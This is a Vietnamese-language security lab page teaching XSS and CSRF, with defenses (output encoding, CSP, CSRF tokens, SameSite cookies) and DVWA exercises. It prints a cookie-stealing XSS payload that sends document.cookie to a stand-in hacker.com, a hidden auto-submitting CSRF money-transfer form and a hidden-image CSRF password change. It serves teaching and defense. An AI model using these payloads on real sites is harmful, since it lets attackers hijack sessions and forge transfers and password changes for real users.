# ⚔️ Web Attacks Lab: XSS & CSRF (Client-Side)

> [← Back to Network Security](../README.md)

Nếu SQL Injection là vua của Server-side, thì XSS là nữ hoàng của Client-side.
Chúng ta sẽ học cách đánh cắp Cookie người dùng và chiếm quyền điều khiển trình duyệt.

---

## 1. Cross-Site Scripting (XSS)

### **A. Cơ chế hoạt động**
XSS xảy ra khi ứng dụng web nhận input từ người dùng (comment, search box) và hiển thị lại nó trên trình duyệt mà không qua bộ lọc (escaping).
Hacker chèn mã JavaScript độc (`<script>alert(1)</script>`) vào input -> Khi nạn nhân mở trang web, mã độc sẽ chạy.

### **B. Phân loại & Tấn công**

#### **1. Reflected XSS (Phản xạ)**
*   **Kịch bản:** Trang web có chức năng tìm kiếm: `http://example.com/search?q=abc`.
*   **Payload:** Hacker gửi link cho nạn nhân:
    `http://example.com/search?q=<script>alert(document.cookie)</script>`
*   **Hậu quả:** Khi nạn nhân click vào link, script chạy -> Hiện thông báo chứa Cookie của họ.
*   **Thực tế:** Hacker sẽ gửi Cookie về server của hắn:
    `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`

#### **2. Stored XSS (Lưu trữ)**
*   **Kịch bản:** Trang web cho phép post comment.
*   **Payload:** Hacker post một comment chứa mã độc.
*   **Hậu quả:** Mã độc được lưu vào Database. Bất kỳ ai (kể cả Admin) vào xem bài viết đó đều bị dính chưởng -> Hacker chiếm quyền Admin.

### **C. Phòng thủ (Defense)**
1.  **Context-aware Encoding:** Mã hóa mọi dữ liệu đầu ra. (VD: `<` thành `&lt;`, `>` thành `&gt;`).
2.  **Content Security Policy (CSP):** Khai báo cho trình duyệt biết nguồn script nào là an toàn.
    *   Header: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com`
    *   Chặn mọi script inline (`<script>...`) và script từ domain lạ.

---

## 2. Cross-Site Request Forgery (CSRF)

### **A. Cơ chế hoạt động**
CSRF lừa trình duyệt của nạn nhân gửi một request (có kèm Cookie xác thực) đến trang web mục tiêu mà nạn nhân không hề hay biết.

### **B. Kịch bản tấn công (Chuyển tiền)**
1.  Nạn nhân đang đăng nhập vào trang ngân hàng `bank.com`.
2.  Hacker dụ nạn nhân vào trang web độc `evil.com`.
3.  Trang `evil.com` chứa một form ẩn (hoặc ảnh):
    ```html
    <form action="http://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="hacker">
        <input type="hidden" name="amount" value="1000">
    </form>
    <script>document.forms[0].submit()</script>
    ```
4.  Vì nạn nhân đã đăng nhập `bank.com`, trình duyệt tự động gửi kèm Cookie xác thực.
5.  Server ngân hàng nhận request hợp lệ -> Chuyển tiền cho Hacker!

### **C. Phòng thủ (Defense)**
1.  **CSRF Token (Anti-forgery Token):**
    *   Server sinh ra một chuỗi ngẫu nhiên (Token) cho mỗi phiên làm việc, nhúng vào form ẩn.
    *   Khi nhận POST request, Server kiểm tra Token có khớp không. Hacker không thể biết Token này vì hắn ở trang khác (`evil.com`).
2.  **SameSite Cookie Attribute:**
    *   Cấu hình Cookie: `Set-Cookie: session_id=...; SameSite=Strict`
    *   Trình duyệt sẽ KHÔNG gửi Cookie nếu request đến từ domain khác.

---

## 3. Lab thực hành (Trên máy ảo Metasploitable)

Trong Metasploitable có sẵn ứng dụng web lỗi tên là **DVWA (Damn Vulnerable Web App)**.

### **Bài tập 1: XSS Reflected (Easy)**
1.  Vào mục "XSS Reflected".
2.  Nhập tên vào ô input: `<script>alert('Hacked!')</script>`.
3.  Bấm Submit -> Thấy popup hiện lên -> Thành công!

### **Bài tập 2: CSRF (Easy)**
1.  Vào mục "CSRF". Có form đổi mật khẩu.
2.  Tự viết một file HTML trên máy Kali (Attacker):
    ```html
    <img src="http://192.168.56.102/dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change" style="display:none;">
    ```
3.  Mở file HTML này trên trình duyệt (giả sử nạn nhân mở).
4.  Quay lại DVWA, thử đăng nhập với pass mới `123` -> Thành công!
